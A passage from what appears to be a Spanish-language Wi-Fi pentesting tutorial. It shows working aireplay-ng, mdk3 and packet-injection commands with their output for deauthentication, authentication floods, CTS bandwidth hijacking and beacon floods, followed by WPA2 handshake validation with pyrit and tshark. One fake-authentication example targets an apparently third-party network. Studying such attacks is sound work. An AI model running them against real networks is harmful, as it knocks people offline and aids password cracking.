 dirección MAC, es expulsar a todos los clientes que se encuentren asociados el AP.

 Esto es mejor incluso, dado que siempre es probable que en una muestra de 20 clientes, 5 de ellos a lo mejor
 no se encuentren lo suficientemente cerca del router para elaborar el ataque (recordemos que esto se puede
 ver tanto desde el **PWR** como a nivel de **Frames** emitidos por la estación). En vez de estar por tanto
 deautenticando de cliente en cliente hasta dar con aquel que se encuentre a una distancia considerable como
 para que capturemos un Handshake, resulta más cómodo expulsarlos a todos.

 Basta con que uno de todos esos clientes se reconecte, para capturar un Handshake válido. Hay que tener en
 cuenta que es posible capturar múltiples Handshakes por parte de distintas estaciones en un mismo AP, pero
 esto no supone ningún problema.

 El ataque se puede elaborar de 2 formas, una es la siguiente:

 * aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon

Obteniendo los siguientes resultados:

 ```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon
21:10:33  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID &quot;20:34:FB:B1:C5:53&quot; to given ESSID &quot;hacklab&quot;.
21:10:33  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:35  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:38  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2| 0 ACKs]
 ```

Y la otra sin especificar ninguna dirección MAC, lo que por defecto la suite interpretará como un ataque de
deautenticación global:

* aireplay-ng -0 0 -e hacklab wlan0mon

Obteniendo estos resultados:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -e hacklab wlan0mon
21:11:46  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID &quot;20:34:FB:B1:C5:53&quot; to given ESSID &quot;hacklab&quot;.
NB: this attack is more effective when targeting
a connected wireless client (-c &lt;client's mac&gt;).
21:11:46  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:51  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
```

#### Ataque de autenticación

Puede sonar raro, pero también existe un ataque llamado ataque de autenticación o asociación. A través de este
ataque, en vez de expulsar a clientes de una red, lo que hacemos es añadirlos.

Te preguntarás, ¿y qué consigo con eso?, buena pregunta. Nuestro objetivo como atacantes es hacer siempre que
de una u otra forma, los clientes de una red sean reasociados para capturar un Handshake. 

¿Qué crees que pasaría si en una red inyectamos 5.000 clientes?, exacto, por ahí van los tiros. Si una red
dispone de tantos clientes asociados, el router se vuelve loco... incluso hasta notaríamos de hacerlo en local
que la red comenzaría a ir lenta, llegando al punto en el que seríamos expulsados de esta hasta detener el
ataque.

Inyectar a un cliente es bastante sencillo, lo hacemos a través del parámetro '**-1**' de aireplay:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo; aireplay-ng --help | tail -n 13 | grep &quot;\-1&quot; | sed '/^\s*$/d' | sed 's/^ *//'; echo

--fakeauth    delay : fake authentication with AP (-1)
```

Imaginemos que tenemos este escenario:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                
```

Veamos cómo podríamos por ejemplo llevar a cabo una falsa autenticación haciendo uso de nuestra tarjeta de red
como estación:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -1 0 -e MOVISTAR_1677 -h 00:a0:8b:cd:02:65 wlan0mon
21:20:28  Waiting for beacon frame (ESSID: MOVISTAR_1677) on channel 6
Found BSSID &quot;1C:B0:44:D4:16:78&quot; to given ESSID &quot;MOVISTAR_1677&quot;.

21:20:28  Sending Authentication Request (Open System) [ACK]
21:20:28  Authentication successful
21:20:28  Sending Association Request

21:20:33  Sending Authentication Request (Open System) [ACK]
21:20:33  Authentication successful
21:20:33  Sending Association Request

21:20:38  Sending Authentication Request (Open System) [ACK]
21:20:38  Authentication successful
21:20:38  Sending Association Request [ACK]
21:20:38  Association successful :-) (AID: 1)
```

Con el parámetro '**-h**', especificamos la dirección MAC del falso cliente a autenticar. Si volvemos a
analizar ahora la red inalámbrica, podremos ver que nuestra tarjeta de red figura como cliente:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                                                                                                     
 1C:B0:44:D4:16:78  00:A0:8B:CD:02:65    0    0 - 1      0        7                         
```

Cabe decir que esto no hace que nos conectemos a la red directamente y ya tengamos internet, sino menuda
gracia, estaríamos bypasseando la seguridad del pleno 802.11. Lo que estamos haciendo es engañar al router,
haciéndole creer que dispone de ese cliente asociado.

A efectos prácticos, por el momento esto no genera ningún inconveniente, ¿cómo autenticamos por tanto ahora a
5.000 clientes?. Podríamos montarnos un simple script que lo hiciera por nosotros generando direcciones MAC
aleatorias, pero ya contamos con una herramienta que nos hace todo el trabajo, **mdk3**.

A través de la utilidad **mdk3**, tenemos un modo de ataque '**Authentication DoS Mode**' que se encarga de
asociar a miles de clientes al AP objetivo. Esto se hace haciendo uso de la siguiente sintaxis:

* mdk3 wlan0mon a -a bssidAP

Veámoslo en la práctica, aplicamos el comando por un lado:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar]
└──╼ #mdk3 wlan0mon a -a 20:34:FB:B1:C5:53 # Dirección MAC del AP hacklab
```

Si analizamos la consola donde estamos monitorizando el AP, podremos notar lo siguiente:

```bash
 CH 12 ][ Elapsed: 1 min ][ 2019-08-08 21:27                                         
                                                                                         
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                         
 20:34:FB:B1:C5:53  -27 100      819      177    2  12  180  WPA2 CCMP   PSK  hacklab    
                                                                                         
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
                                                                                         
 (not associated)   AC:D1:B8:17:91:C0  -73    0 - 1     12       25                       
 20:34:FB:B1:C5:53  22:19:BA:9B:7D:F5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  48:47:15:5C:BB:6F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AF:3B:33:CD:E3:50    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -30    1e- 6e     0      223                       
 20:34:FB:B1:C5:53  3E:A1:41:E1:FC:67    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  21:3D:DC:87:70:E9    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:11:0E:82:74:41    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AB:B2:CD:C6:9B:B4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:17:58:E9:5E:D4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  31:58:A3:5A:25:5D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  C9:9A:66:32:0D:B7    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  76:5A:2E:63:33:9F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:F8:1B:E8:E7:8D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F2:FB:E3:46:7C:C2    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  4A:EC:29:CD:BA:AB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  67:C6:69:73:51:FF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3E:01:7E:97:EA:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  6B:96:8F:38:5C:2A    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  EC:B0:3B:FB:32:AF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3C:54:EC:18:DB:5C    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  02:1A:FE:43:FB:FA    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:3A:FB:29:D1:E6    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:3C:7C:94:75:D8    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  BE:61:89:F9:5C:BB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  A8:99:0F:95:B1:EB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F1:B3:05:EF:F7:00    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  E9:A1:3A:E5:CA:0B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  CB:D0:48:47:64:BD    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  1F:23:1E:A8:1C:7B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:C5:14:73:5A:C5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  5E:4B:79:63:3B:70    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:24:11:9E:09:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:D4:AC:F2:1B:10    0    0 - 1      0        1      
```

Exacto, una locura de clientes asociados que ni llego a seleccionar de lo largo que es la lista. De manera
casi inmediata, la red comienza a ir lenta y se queda temporalmente inoperativa, llegando a expulsar incluso a
los clientes más lejanos o con poca señal WiFi.

#### CTS Frame Attack

Un ataque bastante interesante, que incluso puede llegar a dejar inoperativa una red inalámbrica durante un
largo período de tiempo, aunque paremos el ataque.

Lo que haremos será abrir **Wireshark** por un lado, capturando paquetes de tipo **CTS** (Clear-To-Send):

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6gT.png&quot;&gt;

Recomiendo investigar sobre este tipo de paquetes junto al **RTS**, tienen una historia muy bonita frente al
problema del **nodo oculto**, evitando las famosas colisiones de trama.

Un paquete **CTS** dispone generalmente de 4 campos:

* Frame Control
* Duración
* RA (Dirección del Receptor)
* FCS

El campo del tiempo para dicho paquete puede ser visto rápidamente desde Wireshark (**304 microsegundos**):

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6h5.png&quot;&gt;

Lo que haremos una vez dispongamos de un paquete **CTS**, será exportar dicho paquete en un formato
'**Wireshark/tcpdump/... -pcap**':

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hf.png&quot;&gt;

Si analizamos la captura, veremos que los datos contemplados siguen siendo los mismos:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hp.png&quot;&gt;

Una vez llegados a este punto, en mi caso haré uso de la herramienta '**ghex**' para abrir la captura con un
editor hexadecimal:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hu.png&quot;&gt;

En esta parte es importante hacer la siguiente distinción:

* Los últimos 4 valores: 11 D1 13 85 corresponden al FCS, deberán ser computados por cada variación que
  hagamos sobre el resto de valores. Sin embargo, no nos preocupemos por ello... ya que nos lo dará el propio
  Wireshark :)

* Los 6 valores anteriores al FCS: **30 45 96 BF 9D 2C**, corresponden a la dirección MAC del router. Obviamente, este valor deberá de ser cambiado al deseado.

* Los 2 valores anteriores al FCS: **30 01**, corresponden al tiempo en microsegundos puesto en hexadecimal y
  **Little Endian**.

Para el último punto, por si han habido confusiones:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hA.png&quot;&gt;

Ahí vemos que corresponden a los 304 microsegundos. Ahora bien, aquí es donde viene el vector de ataque, vamos
a ver cuál sería el valor en hexadecimal del valor tope permitido (**30.000 microsegundos**):

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hE.png&quot;&gt;

Tratemos desde **ghex** de sustituir el valor de los 304 microsegundos a 30.000 microsegundos, poniendo su
representación en hexadecimal y Little Endian:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6hP.png&quot;&gt;

**CONSIDERACIÓN**: También he especificado la dirección MAC del AP objetivo en **ghex** (**64:D1:54:88:BA:3C**)

Podríamos pensar que es así de simple, pero no. Recordemos que para cada cambio realizado, hay que computar el
valor del **FCS**, pues de lo contrario el paquete es inválido. Uno puede optar por comerse la cabeza y tratar
de hacerlo manualmente, pero otra forma es guardando y abriendo esa propia captura desde **Wireshark**:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6ia.png&quot;&gt;

Como vemos, es una maravilla, dado que ya el propio **Wireshark** nos da el valor del **FCS** que necesitamos
para la captura manipulada. 

Por tanto, le hacemos caso y lo cambiamos (Recordemos el Little Endian, también se aplica para este caso):

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6in.png&quot;&gt;

Una vez llegados a este punto, guardamos la captura y probamos a abrirla nuevamente desde Wireshark:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6iy.png&quot;&gt;

Esto son buenas noticias, pues no nos sale ningún tipo de error, ¡hemos construido un paquete válido!.

Ahora es cuando viene la parte divertida, inyectemos dicho paquete a nivel de red:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6iJ.png&quot;&gt;

Como vemos, se han tramitado un total de 10.000 paquetes de tipo **CTS** con un tiempo total de 30.000
microsegundos para cada uno. Encima le hemos añadido el parámetro '**--topspeed**' para evitar que el
siguiente paquete se envié una vez el anterior se ha terminado de enviar, haciendo que todos queden en cola.

Por aquí podemos ver los valores de cada uno de estos paquetes enviados:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6iP.png&quot;&gt;

¿Resultado?, lo que se conoce como un secuestro del ancho de banda, haciendo que la red quede completamente
inoperativa durante un largo período de tiempo. No recomiendo hacer el ataque en nuestra propia red.

#### Beacon Flood Mode Attack

Un **beacon** es un paquete que contiene información sobre el punto de acceso, como por ejemplo, en qué canal
se encuentra, qué tipo de cifrado lleva, cómo se llama la red, etc.

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==0x8&quot; 2&gt;/dev/null
    1 0.000000000 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1585, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    2 0.307210202 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1588, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    3 0.614413670 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1591, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    4 0.921614210 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1594, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
```

La peculiaridad de los beacons es que estos se transmiten en claro, ya que las tarjetas de red y otros
dispositivos necesitan poder recoger este tipo de paquetes y extraer la información necesaria para conectarse.

A través de la herramienta **mdk3**, podemos generar un ataque conocido como **Beacon Flood Attack**,
generando montón de paquetes Beacon con información falsa. ¿Qué conseguimos con esto?, pues bueno, uno de los
ataques clásicos consistiría en generar montones de puntos de acceso situados en el mismo canal que un punto
de acceso objetivo, logrando así dañar el espectro de onda de la red dejándola no operativa e invisible por los
usuarios.

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #for i in $(seq 1 10); do echo &quot;MyNetwork$i&quot; &gt;&gt; redes.txt; done
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #cat redes.txt 
MyNetwork1
MyNetwork2
MyNetwork3
MyNetwork4
MyNetwork5
MyNetwork6
MyNetwork7
MyNetwork8
MyNetwork9
MyNetwork10
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 7
```

En este caso, estaríamos generando un buen puñado de puntos de acceso con los **ESSID** listados en el
archivo, todos ellos posicionados en el canal 7. Para los curiosos, el parámetro '**-a**' lo que se encarga es
de anunciar redes WPA2, y el parámetro '**-s**' establece la velocidad de los paquetes emitidos por segundo,
que por defecto están establecidos a 50.

Por si queréis ver cómo se vería todo desde un dispositivo tercero que trata de escanear o listar los puntos
de acceso disponibles en el entorno:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6s8.jpg&quot;&gt;

De hecho, hasta si queréis causar curiosidad en el ambiente, si corréis este modo de ataque con **mdk3** sin
especificar parámetros:

* mdk3 wlan0mon b

Estaríamos generando puntos de acceso con **ESSID's** aleatorios:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6sd.png&quot;&gt;

#### Disassociation Amok Mode Attack

Realmente esto no deja de parecerse a un ataque de de-autenticación dirigido, pero por cultura, **mdk3**
cuenta con unos modos de operación de tipo **Black List/White List**, desde los cuales podemos especificar qué
clientes queremos que no sean deautenticados del AP, añadiendo a los mismos en un White List y viceversa.

Para construir el ataque, simplemente debemos crear un fichero con las direcciones MAC de los clientes a los
cuales queremos de-autenticar del AP. Posteriormente, corremos **mdk3** especificando el modo de ataque y el
canal en el que se encuentra la red:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6tU.png&quot;&gt;

#### Michael Shutdown Exploitation

Tal y como dice la propia descripción de la utilidad:

`&quot;Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets&quot;`

Es decir, podemos llegar a apagar un router a través de este ataque. 

**ANOTACIÓN:** En la práctica, no es muy efectivo.

La sintaxis sería la siguiente:

* mdk3 wlan0mon m -t bssidAP

#### Técnicas Pasivas

Todo lo visto hasta el momento, requiere de la intervención por nuestra parte en el lado del atacante. 

Tendríamos un modo de actuar de forma pasiva para obtener el Handshake, y es simplemente armarnos de valor y
tener paciencia. 

Podríamos quedarnos esperando hasta que algunas de las estaciones asociadas disponga de mala
señal, se desconecte y reasocie automáticamente sin nosotros tener que hacer nada. Podríamos quedarnos
esperando hasta que de pronto alguien nuevo que ya estaba asociado en el pasado a la red se asocie de nuevo al
AP. Se podría hacer de montón de maneras distintas.

Lo importante de todo esto es, que el Handshake, no tiene por qué generarse en base a la reautenticación del
cliente a la red pero sólo si nosotros lo hemos expulsado de la red. Me refiero, el Handshake no guarda
relación alguna con el ataque de de-autenticación para forzar al cliente a que se reconecte a la red.

Siempre el Handshake se va a generar en el momento en el que el cliente se vuelva a conectar a la red, sea por
nuestros medios activos o sin hacer nada a voluntad de la calidad de la señal entre la estación y el AP, o por
el propio cliente que se ha vuelto a reconectar por 'X' razones.

### Validación del Handshake con Pyrit

Hasta ahora hemos visto técnicas para capturar un Handshake. Ahora bien, en ocasiones, puede suceder que la
suite de aircrack-ng nos diga que ha capturado un Handshake cuando realmente no es así, no sería la primera
vez que me ha llegado a suceder.

¿Qué mejor que validar la captura con otra herramienta?, con **pyrit**. Pyrit es una herramienta bestial para
el cracking, análisis de capturas y monitorizado de redes inalámbricas. Uno de los modos de los que dispone,
es de una especie de '**checker**', con el cual podemos analizar la captura para ver si esta cuenta con un
**Handshake** o no.

Por ejemplo, imaginemos que hemos capturado un supuesto Handshake de una red inalámbrica, o al menos eso vemos
desde **aircrack-ng**. Si quisiéramos ahora validarlo desde **Pyrit**, haríamos lo siguiente sobre la captura
'.cap':

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -r Captura-01.cap analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 2 packets (2 802.11-packets), got 1 AP(s)

#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):
No valid EAOPL-handshake + ESSID detected.
```

Como vemos, '**No valid EAOPL-handshake + ESSID detected.**', por lo que la captura no cuenta con ningún
Handshake.

Veamos ahora un caso donde sí nos reporta que la captura cuenta con un Handshake válido:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -r Captura-02.cap analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-02.cap' (1/1)...
Parsed 63 packets (63 802.11-packets), got 1 AP(s)

#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):
  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):
    #1: HMAC_SHA1_AES, good*, spread 1
```

Tal y como se puede observar, la red **hacklab** cuenta con un Handshake generado por parte de la estación
**34:41:5d:46:d1:38**, lo cual incluso nos viene de maravilla, porque así tenemos una traza de todo lo
referente a dicha captura, incluido el nombre de la red inalámbrica en caso de que el nombre de nuestra
captura no identifique al AP.

### Tratamiento y filtro de la captura

Cabe decir que a la hora de capturar un Handshake, capturamos tal vez más de lo que necesitamos durante el
tiempo de espera. La captura final, puede ser tratada para extraer simplemente la información más relevante
del AP, que sería el **eapol**.

Con la herramienta **tshark**, podemos generar una nueva captura filtrando únicamente los paquetes que nos
interesa de la captura previamente realizada:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y &quot;eapol&quot; 2&gt;/dev/null
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y &quot;eapol&quot; 2&gt;/dev/null -w filteredCapture
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -r filteredCapture analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'filteredCapture' (1/1)...
Parsed 4 packets (4 802.11-packets), got 1 AP(s)

#1: AccessPoint 20:34:fb:b1:c5:53 ('None'):
  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):
    #1: HMAC_SHA1_AES, good, spread 1
No valid EAOPL-handshake + ESSID detected.
```

Y como vemos, nos sigue notificando de que hay 1 Handshake válido por parte de la estación especificada. Sin
embargo, vemos que ahora en el campo 'ESSID' de la red nos pone **None**. Esto es así dado que el campo
**eapol** no guarda ese tipo de información. 

Ahora es cuando recapitulamos, ¿qué tipo de paquete es el que
guarda esa información?... exacto, los paquetes **Beacon**, por tanto podemos ajustar un poco más nuestro
filtro para seguir desechando paquetes no necesarios pero filtrando algo más de información en lo referente a
nuestro AP víctima, haciendo uso para ello del operador **OR**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y &quot;wlan.fc.type_subtype==0x08 || eapol&quot; 2&gt;/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
```

En este caso, vemos que ha habido un paquete Beacon capturado, indicando el nombre del ESSID al final de la
primera línea.

Si exportamos dicha captura y analizamos ahora desde **Pyrit**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y &quot;wlan.fc.type_subtype==0x08 || eapol&quot; 2&gt;/dev/null -w filteredCapture
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -r filteredCapture analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'filteredCapture' (1/1)...
Parsed 5 packets (5 802.11-packets), got 1 AP(s)

#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):
  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):
    #1: HMAC_SHA1_AES, good, spread 1
```

El campo **'None'** es sustituido por el **ESSID** de la red. 

**ANOTACIÓN**: En mi opinión, recomiendo hacer uso del siguiente filtrado para este tipo de casos, donde
además de los paquetes **Beacon** es preferible filtrar también por los paquetes **Probe Response**.

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-02.cap -Y &quot;wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol&quot; 2&gt;/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
    3   0.374849 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab
    5   0.586817 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    6   0.590400 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    7   0.594497 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    8   0.596543 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
    9   0.600640 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   10   0.602688 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   11   0.605759 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   12   0.610367 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   13   4.188928 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 229 Probe Response, SN=1935, FN=0, Flags=........, BI=100, SSID=hacklab
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
